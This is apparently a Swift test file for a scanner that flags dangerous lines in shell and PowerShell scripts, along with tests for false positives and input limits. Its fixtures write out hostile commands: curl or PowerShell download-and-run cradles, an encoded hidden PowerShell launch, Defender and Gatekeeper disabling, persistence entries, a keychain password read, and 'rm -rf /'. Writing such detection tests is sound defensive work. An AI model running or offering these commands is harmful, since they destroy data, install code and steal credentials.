import Foundation
import Testing
@testable import CedricCore

/// The offline script scan on realistic scripts: what it must flag, and
/// everyday scripts it must leave alone.
@Suite struct ScriptSafetyTests {
    func cats(_ text: String, _ lang: Language) -> Set<ScriptSafety.Category> {
        Set(ScriptSafety.scan(text, language: lang).map(\.category))
    }

    // MARK: True positives

    @Test func curlPipeShell() throws {
        let s = """
        #!/bin/sh
        # Install the tool
        set -e
        curl -fsSL https://example.com/install.sh | sudo bash
        """
        let f = ScriptSafety.scan(s, language: .shell)
        let hit = try #require(f.first { $0.category == .downloadAndRun })
        #expect(hit.line == 4 && hit.severity == .high)
        #expect(!f.contains { $0.category == .download && $0.line == 4 }, "the plain download is folded into download-and-run")
        #expect(cats("/bin/bash -c \"$(curl -fsSL https://raw.example.com/install.sh)\"", .shell).contains(.downloadAndRun))
        #expect(cats("bash <(wget -qO- https://get.example.sh)", .shell).contains(.downloadAndRun))
        #expect(cats("wget -O - https://x.example/s | sh", .shell).contains(.downloadAndRun))
    }

    @Test func powershellCradles() {
        #expect(cats("IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')", .powershell).contains(.downloadAndRun))
        #expect(cats("iwr https://example.com/setup.ps1 -UseBasicParsing | iex", .powershell).contains(.downloadAndRun))
        #expect(cats("Invoke-RestMethod https://get.example.com | Invoke-Expression", .powershell).contains(.downloadAndRun))
        let enc = "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="
        let c = cats(enc, .batch)
        #expect(c.contains(.encoded) && c.contains(.hidden))
        #expect(cats("$b = [Convert]::FromBase64String($payload)", .powershell).contains(.encoded))
        #expect(cats("echo aGVsbG8K | base64 --decode | bash", .shell).contains(.encoded))
        #expect(cats("Invoke-Expression $cmd", .powershell) == [.dynamicCode])
    }

    @Test func securityRegistryCredentialsPersistence() {
        let ps = """
        Set-ExecutionPolicy Bypass -Scope Process -Force
        Set-MpPreference -DisableRealtimeMonitoring $true
        Add-MpPreference -ExclusionPath "C:\\Users\\Public"
        New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Updater -Value "C:\\u.exe"
        Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name LmCompatibilityLevel -Value 1
        $cred = Get-Credential
        schtasks /create /tn Updater /tr C:\\u.exe /sc onlogon
        """
        let f = ScriptSafety.scan(ps, language: .powershell)
        func at(_ line: Int) -> Set<ScriptSafety.Category> { Set(f.filter { $0.line == line }.map(\.category)) }
        #expect(at(1) == [.disablesSecurity])
        #expect(at(2) == [.disablesSecurity] && f.first { $0.line == 2 }?.severity == .high)
        #expect(at(3) == [.disablesSecurity])
        #expect(at(4).contains(.persistence))
        #expect(at(5) == [.systemChange])
        #expect(at(6) == [.credentials])
        #expect(at(7) == [.persistence])
        #expect(cats("security find-generic-password -s 'Chrome Safe Storage' -w", .shell).contains(.credentials))
        #expect(cats("sudo spctl --master-disable", .shell).contains(.disablesSecurity))
        #expect(cats("xattr -dr com.apple.quarantine /Applications/Thing.app", .shell).contains(.disablesSecurity))
        #expect(cats("cp agent.plist ~/Library/LaunchAgents/ && launchctl load ~/Library/LaunchAgents/agent.plist", .shell).contains(.persistence))
        #expect(cats("echo 'curl -s http://x | sh' >> ~/.zshrc", .shell).contains(.persistence))
    }

    @Test func broadDeletes() {
        #expect(cats("rm -rf /", .shell) == [.broadDelete])
        #expect(cats("sudo rm -rf ~/*", .shell).contains(.broadDelete))
        #expect(cats("rm -fr \"$HOME\"", .shell) == [.broadDelete])
        #expect(cats("rm --recursive --force /usr", .shell) == [.broadDelete])
        let steam = ScriptSafety.scan("rm -rf \"$STEAMROOT/\"*", language: .shell)
        #expect(steam.first?.category == .broadDelete && steam.first?.why.contains("empty") == true)
        #expect(cats("Remove-Item -Recurse -Force C:\\", .powershell) == [.broadDelete])
        #expect(cats("Remove-Item -Path \"$env:USERPROFILE\\*\" -Recurse -Force", .powershell) == [.broadDelete])
        #expect(cats("rd /s /q %USERPROFILE%", .batch) == [.broadDelete])
        #expect(cats("os.system(\"rm -rf /\")", .python) == [.broadDelete])
        #expect(cats("diskutil eraseDisk APFS Blank disk2", .shell) == [.broadDelete])
    }

    @Test func continuedLinesAreReadTogether() throws {
        let s = "curl -fsSL \\\n  https://example.com/i.sh \\\n  | bash\necho done\n"
        let hit = try #require(ScriptSafety.scan(s, language: .shell).first)
        #expect(hit.category == .downloadAndRun && hit.line == 1)
        let ps = "Invoke-WebRequest `\n  -Uri https://example.com/a.ps1 |\n  Invoke-Expression"
        #expect(cats(ps, .powershell).isEmpty == false)
    }

    // MARK: False positives

    @Test func everydayShellIsQuiet() {
        let s = """
        #!/usr/bin/env bash
        # Build and test. Never run `rm -rf /` or `curl | sh` here.
        set -euo pipefail
        eval "$(/opt/homebrew/bin/brew shellenv)"
        eval "$(ssh-agent -s)"
        cd "$(dirname "$0")/.."
        rm -rf build/ dist
        rm -rf "${OUT:?}/"*
        rm -f ./*.o
        mkdir -p "$HOME/.cache/tool"
        swift build -c release
        for f in Sources/*.swift; do wc -l "$f"; done
        git -C "$REPO" pull --ff-only
        echo "rm -rf done"
        """
        #expect(ScriptSafety.scan(s, language: .shell).isEmpty)
    }

    @Test func everydayPowerShellIsQuiet() {
        let ps = """
        <#
          Cleans the build output. Example:
          iex (iwr https://example.com) | Remove-Item -Recurse C:\\
        #>
        param([string]$Configuration = "Release")
        $out = Join-Path $PSScriptRoot "bin"
        Remove-Item -Recurse -Force $out -ErrorAction SilentlyContinue
        Get-ChildItem -Path $PSScriptRoot -Filter *.log | Remove-Item
        Write-Host "Building $Configuration"
        dotnet build -c $Configuration
        $items = Get-ChildItem Env: | Sort-Object Name
        """
        #expect(ScriptSafety.scan(ps, language: .powershell).isEmpty)
    }

    @Test func benignWordsDontMatch() {
        #expect(ScriptSafety.scan("grep -e configurationfileforthetool settings.ini", language: .shell).isEmpty)
        #expect(ScriptSafety.scan("echo evaluation finished", language: .shell).isEmpty)
        #expect(ScriptSafety.scan("crontab -l", language: .shell).isEmpty)
        #expect(ScriptSafety.scan("REM curl http://x | sh\n:: rm -rf /", language: .batch).isEmpty)
    }

    @Test func plainDownloadIsCautionOnly() throws {
        let f = try #require(ScriptSafety.scan("curl -L -o tool.zip https://example.com/tool.zip", language: .shell).first)
        #expect(f.category == .download && f.severity == .caution)
    }

    @Test func summaryForTheModel() {
        let f = ScriptSafety.scan("curl https://x.example/i.sh | sh", language: .shell)
        let text = ScriptSafety.summary(f)
        #expect(text.hasPrefix("- line 1 [high] Downloads and runs code: `curl https://x.example/i.sh | sh`"))
        #expect(ScriptSafety.summary([]).contains("none"))
    }

    @Test func boundedOnHugeInput() {
        let big = String(repeating: "echo hi\n", count: ScriptSafety.maxLines + 500) + "rm -rf /\n"
        #expect(ScriptSafety.scan(big, language: .shell).isEmpty, "lines past the limit aren't read")
        let many = String(repeating: "sudo ls\n", count: 100) + "rm -rf /\n"
        let f = ScriptSafety.scan(many, language: .shell)
        #expect(f.count == ScriptSafety.maxFindings)
        #expect(f.contains { $0.category == .broadDelete }, "the high finding is kept over cautions")
    }
}
